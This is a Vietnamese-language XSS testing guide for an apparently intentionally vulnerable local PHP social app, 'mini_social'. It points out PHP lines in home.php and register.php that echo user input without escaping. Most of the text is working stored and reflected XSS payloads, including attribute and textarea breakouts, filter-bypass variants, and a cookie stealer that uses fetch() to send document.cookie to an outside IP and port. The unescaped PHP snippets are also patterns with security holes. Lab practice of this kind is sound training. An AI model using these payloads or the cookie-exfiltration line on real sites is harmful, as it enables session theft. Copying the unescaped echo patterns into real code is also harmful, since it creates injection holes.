

## ✅ **1. STORED XSS - Post Content (home.php line 219)**

### **Lỗ hổng:**
```php
<?php echo nl2br($post['content']); ?>  // KHÔNG có htmlspecialchars()
```

### **Cách test:**
1. Đăng nhập vào mini_social
2. Tạo post mới với payload
3. Payload sẽ được lưu vào database
4. Mọi user xem trang home sẽ bị XSS

### **Payloads:**

#### **Level 2: Basic Alert**
<script>alert('XSS Works!')</script>

#### **Level 4: Image onerror**
```html
<img src=x onerror="alert(document.cookie)">
```

#### **Level 5: SVG onload**
<svg onload="alert(document.cookie)"></svg>

#### **Level 6: iframe srcdoc**
<iframe srcdoc="<script>alert('XSS')</script>"></iframe>

#### **Level 7: Details ontoggle**
<details open ontoggle="alert(document.cookie)">
<summary>Click</summary>
</details>

---

## ✅ **2. REFLECTED XSS - Search Query (home.php line 187 & 192)**

### **Lỗ hổng:**
```php
// Line 187: Reflected trong input value
value="<?php echo isset($_GET['q']) ? $_GET['q'] : ''; ?>"

// Line 192: Reflected trong div
<?php echo $_GET['q']; ?>  // KHÔNG có htmlspecialchars()
```

### **Cách test:**
Truy cập URL:
```
http://localhost/mini_social/home.php?q=[PAYLOAD]
```

### **Payloads:**

#### **Payload 1: Basic**
```
http://localhost/mini_social/home.php?q=<script>alert('XSS')</script>
```

#### **Payload 2: IMG tag**
```
http://localhost/mini_social/home.php?q=<img src=x onerror=alert(1)>
```

#### **Payload 3: Break out of value attribute**
```
http://localhost/mini_social/home.php?q="><script>alert(document.cookie)</script>
```

#### **Payload 4: Event handler**
```
http://localhost/mini_social/home.php?q=" onfocus="alert(1)" autofocus="
```

#### **Payload 5: SVG**
```
http://localhost/mini_social/home.php?q=<svg/onload=alert(document.domain)>
```

#### **Payload 6: Cookie stealer**
```
http://localhost/mini_social/home.php?q=<img src=x onerror="fetch('http://192.168.10.128:8000/?c='+document.cookie)">
```

---

## ✅ **3. STORED XSS - Username Display (home.php line 158 & 207)**

### **Lỗ hổng:**
```php
// Line 158
<?php echo isset($_SESSION['username']) ? $_SESSION['username'] : 'Guest'; ?>

// Line 207
<?php echo $post['username']; ?>  // KHÔNG có htmlspecialchars()
```

### **Cách test:**
1. Register với username chứa XSS payload
2. Login và tạo post
3. Username sẽ hiển thị mà không sanitize

### **Payloads (trong form register):**

#### **Username payload:**
```html
<script>alert('XSS from username')</script>
```

```html
<img src=x onerror=alert(1)>
```

```html
<svg onload=alert(document.cookie)>
```

**Note:** Có thể database có constraint về username, thử payload ngắn hơn:
```html
<img src=x onerror=alert(1)>
```

---

## ✅ **4. STORED XSS - Email Field (register.php line 71)**

### **Lỗ hổng:**
```php
value="<?php echo $_POST['email'] ?? ''; ?>"  // KHÔNG có htmlspecialchars()
```

### **Cách test:**
1. Vào trang register
2. Nhập email có payload
3. Submit bị lỗi (sẽ quay lại form)
4. Email được reflected không sanitize

### **Payloads:**

#### **Break out of value:**
```html
test" onfocus="alert(1)" autofocus="
```

#### **Or:**
```html
"><script>alert(document.cookie)</script><input value="
```

---

## ✅ **5. STORED XSS - Post Content in Textarea (home.php line 223)**

### **Lỗ hổng:**
```php
<textarea><?php echo $post['content']; ?></textarea>  // KHÔNG có htmlspecialchars()
```

### **Cách test:**
1. Tạo post với payload break out of textarea
2. Click nút "Sửa" để mở form edit
3. Payload sẽ execute khi textarea được render

### **Payloads:**

```html
</textarea><script>alert('XSS from textarea')</script><textarea>
```

```html
</textarea><img src=x onerror=alert(document.cookie)><textarea>
```

---

## 🎯 **BEST PAYLOADS ĐỂ TEST:**

### **1. Kiểm tra nhanh (HTML Injection):**
```html
<h1>TEST</h1>
```
Nếu thấy heading → XSS hoạt động!

### **2. Alert đơn giản:**
```html
<script>alert('XSS')</script>
```

**Payload:**
```html
<img src=x onerror="fetch('http://192.168.10.128:8000/?c='+document.cookie)">
```

### **4. Bypass filters (nếu có):**
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)><summary>a</summary></details>
<iframe srcdoc="<script>alert(1)</script>">
```

---

## 📋 **CHECKLIST TEST XSS:**

- [ ] **Test 1:** Post content với `<h1>TEST</h1>`
- [ ] **Test 2:** Search với `?q=<h1>TEST</h1>`
- [ ] **Test 3:** Register username với `<img src=x onerror=alert(1)>`
- [ ] **Test 4:** Search với `?q="><script>alert(1)</script>`
- [ ] **Test 5:** Post với `<script>alert(document.cookie)</script>`
- [ ] **Test 6:** Setup server và test cookie stealer
- [ ] **Test 7:** Post với textarea breakout payload

---
